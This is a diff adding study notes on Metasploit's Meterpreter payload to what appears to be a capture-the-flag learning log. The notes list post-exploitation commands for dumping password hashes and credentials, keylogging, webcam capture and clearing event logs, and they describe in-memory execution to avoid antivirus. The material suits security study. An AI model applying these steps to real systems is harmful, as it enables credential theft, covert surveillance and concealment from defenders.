@@ -3601,6 +3601,150 @@ Once the target executes the payload, you will receive a session.
 
 ### Room 4 - Metasploit: Meterpreter
 
+**Learning Objectives**
+- Understand how Meterpreter works
+- Know the different Meterpreter versions
+- Use common Meterpreter commands
+- Perform post-exploitation tasks
+- Migrate processes, dump hashes, and load extensions
+
+---
+
+#### What is Meterpreter?
+
+Meterpreter is an advanced Metasploit payload that runs **in memory** (does not write to disk).  
+
+Key features:
+- Runs entirely in RAM → harder for antivirus to detect
+- Uses encrypted communication (TLS) with the attacker
+- Acts as a powerful command-and-control agent on the target
+
+---
+
+#### Meterpreter Flavors
+
+Meterpreter comes in many versions depending on the target:
+
+- Windows (x86 / x64)
+- Linux
+- Android
+- PHP / Python / Java
+- macOS / iOS
+
+**Staged vs Inline**
+- **Staged** → Small stager first, then downloads the full payload (e.g. `windows/x64/meterpreter/reverse_tcp`)
+- **Inline (Stageless)** → Full payload sent at once (e.g. `windows/x64/meterpreter_reverse_tcp`)
+
+---
+
+#### Essential Meterpreter Commands
+
+**Core Commands**
+| Command | Purpose |
+|---------|---------|
+| `background` / `bg` | Background the current session |
+| `sessions` | List or switch sessions |
+| `exit` | Close the session |
+| `help` | Show available commands |
+| `migrate <PID>` | Move Meterpreter to another process |
+| `getpid` | Show current process ID |
+| `getuid` | Show current user |
+| `sysinfo` | Show system information |
+
+**File System Commands**
+| Command | Purpose |
+|---------|---------|
+| `ls` / `dir` | List files |
+| `cd` | Change directory |
+| `pwd` | Print working directory |
+| `cat` | Read a file |
+| `download` | Download a file |
+| `upload` | Upload a file |
+| `search -f filename` | Search for files |
+| `rm` | Delete a file |
+
+**System Commands**
+| Command | Purpose |
+|---------|---------|
+| `ps` | List running processes |
+| `shell` | Drop into a system shell |
+| `execute -f cmd.exe` | Run a command |
+| `getsystem` | Attempt privilege escalation to SYSTEM |
+| `hashdump` | Dump SAM password hashes |
+| `clearev` | Clear event logs |
+
+**Other Useful Commands**
+| Command | Purpose |
+|---------|---------|
+| `keyscan_start` | Start keylogger |
+| `keyscan_dump` | Dump captured keystrokes |
+| `keyscan_stop` | Stop keylogger |
+| `screenshot` | Take a screenshot |
+| `screenshare` | Live desktop view |
+| `webcam_snap` | Take a photo from webcam |
+| `idletime` | Show how long the user has been idle |
+
+---
+
+#### Post-Exploitation Workflow
+
+1. **Check your privileges**
+   ```bash
+   getuid
+   sysinfo
+   ```
+2. Migrate to a more stable/safer process (optional)
+```Bash
+ps
+migrate <PID>
+```
+3. Dump password hashes
+```Bash
+hashdump
+```
+4. Load additional tools
+```Bash
+load kiwi          # Mimikatz-like functionality
+load python
+```
+5. Search for interesting files
+```Bash
+search -f *.txt
+search -f *pass*
+```
+6. Drop into a regular shell if needed
+```Bash
+shell
+```
+
+---
+
+#### Useful Extensions
+
+| Extension    | Purpose                                |
+| ------------ | -------------------------------------- |
+| `kiwi`       | Credential dumping (Mimikatz features) |
+| `python`     | Run Python commands on the target      |
+| `powershell` | PowerShell functionality               |
+
+**Example:**  
+```Bash
+load kiwi
+creds_all
+```
+
+---
+
+#### Quick Tips
+- Always run `help` after getting a Meterpreter session — available commands depend on the version.
+- Migrating to a process running as a lower-privileged user can cause you to lose privileges.
+- `hashdump` requires high privileges (usually SYSTEM).
+- Use `background` so you can work with multiple sessions.
+
+---
+
+**End of Room 4**
+
 </details> <!-- Ends Room 4 -->
 
 ---
@@ -3609,6 +3753,30 @@ Once the target executes the payload, you will receive a session.
 <summary><strong>Room 5 - Blue</strong></summary>
 
 ### Room 5 - Blue
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </details> <!-- Ends Room 5 -->
 
